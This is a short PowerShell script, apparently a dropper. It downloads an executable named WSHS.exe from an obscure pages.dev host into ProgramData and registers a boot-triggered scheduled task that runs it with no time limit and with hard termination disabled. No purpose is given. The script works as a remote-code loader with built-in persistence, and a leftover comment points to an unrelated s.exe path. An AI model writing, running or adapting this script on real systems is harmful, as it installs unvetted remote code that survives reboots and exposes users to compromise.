# Get the current user SID
$currentSID = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value

# Define the paths
$folderPath = "C:\ProgramData\WSHS"
$exePath = "$folderPath\WSHS.exe"
$downloadURL = "https://ipnqtxhsbvcmurjolgkfadzweyf.pages.dev/files/WSHS.exe"
$taskName = "WSHSTask"

# Check if the folder exists, if not, create it
if (-not (Test-Path -Path $folderPath -PathType Container)) {
    New-Item -Path $folderPath -ItemType Directory | Out-Null
}

# Download the file if it doesn't exist
if (-not (Test-Path -Path $exePath)) {
    Invoke-WebRequest -Uri $downloadURL -OutFile $exePath
}

# Update the task XML content with the new executable path
$xmlContent = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2024-05-24T09:35:08.1353551</Date>
    <Author>$currentSID</Author>
    <URI>\start</URI>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>$currentSID</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>$exePath</Command>
    </Exec>
  </Actions>
</Task>
"@

# Register the task using the updated XML content
Register-ScheduledTask -Xml $xmlContent -TaskName $taskName -User $currentSID

# Replace "C:\Users\User\Desktop\s.exe" with the actual path to your executable file.
